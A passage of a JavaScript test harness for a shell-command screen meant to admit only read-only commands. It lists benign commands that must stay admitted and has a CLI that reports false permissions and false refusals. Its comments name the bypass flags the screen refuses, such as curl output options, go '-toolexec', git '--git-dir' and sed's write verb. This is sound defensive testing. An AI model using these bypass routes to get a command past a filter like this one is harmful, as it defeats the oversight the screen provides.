  "npm --registry https://registry.npmjs.org ls",
  "systemctl --no-pager status barkpark.service",
  "systemctl -p ActiveState show barkpark.service",
  "launchctl list",
  // The cry-wolf mirror: bp's writing VERBS include `open`, `log`, `move` and
  // `stage` — ordinary words in an honest read's ARGUMENTS. Matching the
  // `<noun> <verb>` PAIR at bp's own grammar positions is what keeps these
  // admitted, and a flat scan of those verbs is what would not.
  "bp task ready --status open",
  "bp doc query task --filter lifecycle_status=open",
  "bp task get task-abc",
  "bp capabilities -o json",
  "bp search grip screen release",
  // The mirror: a BARE name keeps the bound it already had (`PATH=` is refused
  // by name one layer up), and an absolute path under a system bin directory is
  // not reachable from the corpus or the checkout.
  "/usr/bin/git log -1",
  "/bin/ls -la",
  "/usr/local/bin/rg -n handleRequest api/lib",
  "/opt/homebrew/bin/jq .foo file.json",
  // The honest mirror of the indirection fix. `jq -f` and `grep -f` also name a
  // file the screen never reads and MUST stay admitted — the hazard is the
  // file's POWER (sed's `w`, curl's `output`), not its unreadability. And
  // `git -c core.pager=cat log` is the row tgw12-s1's own comment named.
  "rg -n handleRequest api/lib",
  "rg --pre-glob *.gz pattern .",
  "jq -f /tmp/query.jq file.json",
  "grep -f /tmp/patterns.txt file.txt",
  "find . -name *.ex -printf %f",
  "git -c core.pager=cat log",
  "git -c color.ui=false status",
  "sort --files0-from=/tmp/list.txt",
  "curl -sS https://example.com/",
  // The guard targets the WRITE, never the flag: /dev/null stays admitted for
  // every file-target flag, exactly as it already is for `-o`.
  "curl -sS -D /dev/null https://example.com/",
  "curl -sS -c /dev/null https://example.com/",
  "curl -sS -b /tmp/jar.txt https://example.com/",
  // ── tgw12-s2. THE MIRROR OF EACH BYPASS ABOVE. Every one of the six fixes
  // narrows a check the corpus depends on, so each gets its honest twin here.
  // Without these the whole slice could be "passed" by refusing more, which is
  // the failure direction this set exists to catch.
  //
  // Lexical `.`/`..` resolution must ADMIT a path that stays inside a trusted
  // bin directory after resolving — refusing these would be the wrong fix.
  "/usr/bin/../bin/git log -1",
  "/usr/bin/./git log -1",
  // The two `CC=` spellings the corpus actually uses — 100 rows between them.
  "CC=clang go test ./...",
  "CC=/usr/bin/clang go test ./...",
  // go's OTHER `-tool`/`-test`-prefixed flags are names, not prefixes: these
  // read, and name-equality is what keeps them distinct from `-toolexec`.
  "go test -tags integration ./...",
  "go test -test.v -run TestFoo ./...",
  // curl's `-w` is refused for `%output{` and `@file` ONLY. The 12 corpus rows
  // are status formats and every one must stay admitted.
  "curl -s -o /dev/null -w %{http_code} https://x/",
  "curl -s -w %{time_total} https://x/",
  // The trace/cache flags target the WRITE, so /dev/null is admitted for the
  // three new ones exactly as it already is for `-D` and `-c`.
  "curl -sS -o /dev/null --hsts /dev/null https://example.com/",
  "curl -sS -o /dev/null --alt-svc /dev/null https://example.com/",
  // `--git-dir` is refused; `--work-tree` and `--namespace` name no config file
  // and are NOT, or the fix would be crying wolf on the honest half.
  "git --work-tree /some/tree status --short",
  "git --namespace foo log -1",
  // `-O` is refused on `git grep` ONLY. `git diff -O<file>` is `--orderfile`,
  // which READS, and the ordinary `git grep` reads must be untouched.
  "git grep -n screenCommand -- tooling/grip",
  "git grep -l --heading pattern",
  "git diff -O/tmp/orderfile HEAD~1",
  // `ack --ackrc` is refused; ack's ordinary reads are not.
  "ack -n pattern lib/",
];

/**
 * Run the three sets. Returns misses in both directions — a false PERMISSION
 * and a false REFUSAL are both failures, and reporting only one is how a
 * screen oscillates.
 */
export function runNamedSets(screen = screenCommand) {
  const falsePermissions = DANGER_SET.filter((c) => screen(c).ok);
  const falseRefusals = [...REGRESSION_SET, ...NEVER_CRY_WOLF_SET].filter((c) => !screen(c).ok);
  return { falsePermissions, falseRefusals };
}

// ─────────────────────────────────────────────────────────────────────────────
// CLI
// ─────────────────────────────────────────────────────────────────────────────

async function loadCorpusCommands() {
  const { readFileSync } = await import("node:fs");
  const { fileURLToPath } = await import("node:url");
  const path = fileURLToPath(new URL("./fixtures/evidence-corpus.json", import.meta.url));
  const corpus = JSON.parse(readFileSync(path, "utf8"));
  return corpus.proofs.map((p) => p?.command).filter((c) => typeof c === "string" && c.trim());
}

async function census() {
  const commands = await loadCorpusCommands();
  const r = screenAll(commands);
  console.log("census reach — the frozen evidence corpus (tooling/grip/fixtures/evidence-corpus.json)");
  console.log(`  distinct commands   ${r.total}`);
  console.log(`  ADMITTED            ${r.admitted}`);
  console.log(`  refused             ${r.refused}`);
  console.log(`  admission rate      ${(r.rate * 100).toFixed(1)}%`);
  console.log("");
  console.log("  This is the census's HONEST REACH over THESE commands. A statistic later");
  console.log("  derived over the admitted subset describes that subset — it may never be");
  console.log(`  restated as covering all ${r.total} commands.`);
  console.log("");
  console.log("top refusal reasons:");
  for (const [why, n] of [...r.byReason].sort((a, b) => b[1] - a[1]).slice(0, 12)) {
    console.log(`  ${String(n).padStart(4)}  ${why}`);
  }
  return r;
}

function selftest() {
  const { falsePermissions, falseRefusals } = runNamedSets();
  console.log(`DANGER SET          ${DANGER_SET.length - falsePermissions.length}/${DANGER_SET.length} refused`);
  for (const c of falsePermissions) console.log(`  FALSE PERMISSION  ${c}`);
  console.log(`REGRESSION SET      ${REGRESSION_SET.length - REGRESSION_SET.filter((c) => !screenCommand(c).ok).length}/${REGRESSION_SET.length} admitted`);
  console.log(`NEVER-CRY-WOLF SET  ${NEVER_CRY_WOLF_SET.length - NEVER_CRY_WOLF_SET.filter((c) => !screenCommand(c).ok).length}/${NEVER_CRY_WOLF_SET.length} admitted`);
  for (const c of falseRefusals) console.log(`  FALSE REFUSAL     ${c} — ${screenCommand(c).reason}`);
  return falsePermissions.length + falseRefusals.length;
}

const isMain = process.argv[1] && import.meta.url === new URL(`file://${process.argv[1]}`).href;
if (isMain) {
  const mode = process.argv[2] || "--verify";
  try {
    if (mode === "--census") await census();
    else if (mode === "--selftest") {
      if (selftest() > 0) process.exit(1);
      console.log("PASS: all three named sets hold.");
    } else if (mode === "--verify") {
      const misses = selftest();
      console.log("");
      await census();
      if (misses > 0) process.exit(1);
    } else {
      console.error("usage: node tooling/grip/screen.mjs [--verify|--census|--selftest]");
      process.exit(2);
    }
  } catch (e) {
    console.error(`ERROR: ${e?.message || e}`);
    process.exit(2);
  }
}
